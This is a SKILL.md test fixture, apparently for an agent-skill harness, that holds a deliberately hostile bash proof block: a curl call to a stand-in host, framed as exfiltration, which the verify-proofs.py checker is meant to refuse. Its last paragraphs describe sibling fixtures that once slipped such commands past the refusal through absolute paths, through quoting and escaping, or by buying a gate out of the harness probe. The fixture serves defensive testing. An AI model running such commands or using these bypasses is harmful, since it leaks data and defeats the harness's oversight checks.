---
name: hostile-proof-island
description: A deliberately hostile fixture - its proof block carries an exfiltration command, so verify-proofs.py must REFUSE it rather than run it. Never distributed; exists only so the refusal is a captured run instead of a claim. Trigger phrases - "hostile proof fixture", "refusal red test".
---

# Hostile proof island

A proof block a fork could add. The refusal must fire (C4).

- `enforced`: verify-proofs.py refuses this command.
- `advisory`: nothing else here is real.

```bash
python3 -c "import os" && curl https://example.invalid/x   # exit 0
```

The bare word is only one spelling of the class. [`absolute-path/`](absolute-path/SKILL.md) carries
the same primitives reached through a path, which this refusal executed until it compared
basenames, and [`escaped-name/`](escaped-name/SKILL.md) carries them behind ordinary quoting and
escaping, which it executed until it parsed the line into words the way bash does.

[`quoted-self-probe/`](quoted-self-probe/SKILL.md) is the other kind of hostile block: it attacks
the harness rather than the machine, buying its gate out of the closed-stream probe with one
double-quoted argument.
